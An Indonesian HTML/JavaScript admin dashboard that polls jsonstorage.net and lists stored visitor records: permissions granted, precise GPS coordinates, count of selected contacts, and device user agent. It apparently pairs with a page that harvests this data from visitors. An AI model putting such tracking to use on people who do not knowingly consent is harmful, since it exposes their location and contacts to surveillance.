<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Panel Admin Pengunjung</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
    }

    body {
      background: #0f172a;
      color: #f8fafc;
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      max-width: 960px;
      margin: 0 auto;
    }

    .top {
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 10px;
      margin-bottom: 16px;
      padding-bottom: 12px;
      border-bottom: 1px solid #334155;
    }

    .top h2 {
      font-size: 18px;
      font-weight: 700;
    }

    .sub {
      font-size: 12px;
      color: #94a3b8;
      margin-top: 4px;
    }

    .actions {
      display: flex;
      gap: 8px;
      flex-wrap: wrap;
    }

    button {
      background: #118eea;
      color: #ffffff;
      border: none;
      border-radius: 6px;
      padding: 8px 13px;
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
    }

    button:hover {
      opacity: 0.92;
    }

    button.del {
      background: #dc2626;
    }

    .card {
      background: #1e293b;
      border: 1px solid #334155;
      border-radius: 10px;
      padding: 14px;
      margin-bottom: 12px;
    }

    .meta {
      font-size: 13px;
      color: #cbd5e1;
      line-height: 1.55;
      word-break: break-word;
    }

    .card-footer {
      margin-top: 10px;
      display: flex;
      gap: 8px;
      flex-wrap: wrap;
    }

    .empty, .err {
      background: #1e293b;
      border: 1px solid #334155;
      border-radius: 10px;
      padding: 18px;
      font-size: 13px;
    }

    .err {
      color: #f87171;
      border-color: #7f1d1d;
    }

    .empty {
      color: #94a3b8;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="top">
      <div>
        <h2>Pengunjung Tersimpan (<span id="count">0</span>)</h2>
        <div class="sub" id="statusBar">Menghubungkan ke jsonstorage.net...</div>
      </div>
      <div class="actions">
        <button id="btnRefresh" type="button">Muat Ulang</button>
      </div>
    </div>

    <div id="list"></div>
  </div>

  <script type="module">
    import { loadVisitors, deleteVisitorRecord } from "./js/visitor-store.js";

    const listEl = document.getElementById("list");
    const countEl = document.getElementById("count");
    const statusBarEl = document.getElementById("statusBar");
    let isFetching = false;

    function escapeHtml(str) {
      return String(str || "").replace(/[&<>"']/g, (ch) => ({
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        "\"": "&quot;",
        "'": "&#39;"
      }[ch]));
    }

    async function render(silent = false) {
      if (isFetching) return;
      isFetching = true;

      if (!silent) {
        listEl.innerHTML = `<div class="empty">Memuat data...</div>`;
      }

      try {
        const visitors = await loadVisitors();
        const items = Object.values(visitors).sort((a, b) => (b.lastSeenAt || 0) - (a.lastSeenAt || 0));
        countEl.textContent = String(items.length);
        statusBarEl.textContent = `Auto-sync aktif (tiap 3d) • ${items.length} data tersimpan permanen • Update: ${new Date().toLocaleTimeString("id-ID")}`;

        if (items.length === 0) {
          listEl.innerHTML = `<div class="empty">Belum ada data pengunjung tersimpan.</div>`;
          return;
        }

        const fragment = document.createDocumentFragment();
        for (const v of items) {
          const div = document.createElement("div");
          div.className = "card";

          const hasCoords = v.location && typeof v.location.lat === "number" && typeof v.location.lng === "number";
          const locText = hasCoords
            ? `${v.location.lat}, ${v.location.lng} (±${v.location.accuracy || 0}m)`
            : "Tidak ada";
          const p = v.permissions || {};
          const seenText = new Date(v.lastSeenAt || Date.now()).toLocaleString("id-ID");

          div.innerHTML = `
            <div class="meta">
              <strong>ID:</strong> ${escapeHtml(v.visitorId)}<br/>
              <strong>Terakhir Dilihat:</strong> ${escapeHtml(seenText)}<br/>
              <strong>Izin:</strong> Lokasi=${escapeHtml(p.location || "-")}, Kamera=${escapeHtml(p.camera || "-")}, Notif=${escapeHtml(p.notification || "-")}, Kontak=${escapeHtml(p.contacts || "-")}<br/>
              <strong>Lokasi:</strong> ${escapeHtml(locText)} | <strong>Kontak Terpilih:</strong> ${Number(v.contactsCount || 0)}<br/>
              <strong>Perangkat:</strong> ${escapeHtml(v.userAgent || "-")}
            </div>
            <div class="card-footer">
              <button type="button" class="del" data-id="${escapeHtml(v.visitorId)}">Hapus Permanen</button>
            </div>
          `;

          div.querySelector("button.del").addEventListener("click", async () => {
            try {
              await deleteVisitorRecord(v.visitorId);
              await render(false);
            } catch (err) {
              alert("Gagal menghapus: " + err.message);
            }
          });

          fragment.appendChild(div);
        }

        listEl.innerHTML = "";
        listEl.appendChild(fragment);
      } catch (err) {
        countEl.textContent = "0";
        statusBarEl.textContent = "Gagal memuat dari jsonstorage.net";
        listEl.innerHTML = `<div class="err">Error: ${escapeHtml(err.message)}</div>`;
      } finally {
        isFetching = false;
      }
    }

    document.getElementById("btnRefresh").addEventListener("click", () => render(false));
    render(false);
    setInterval(() => render(true), 3000);
  </script>
</body>
</html>
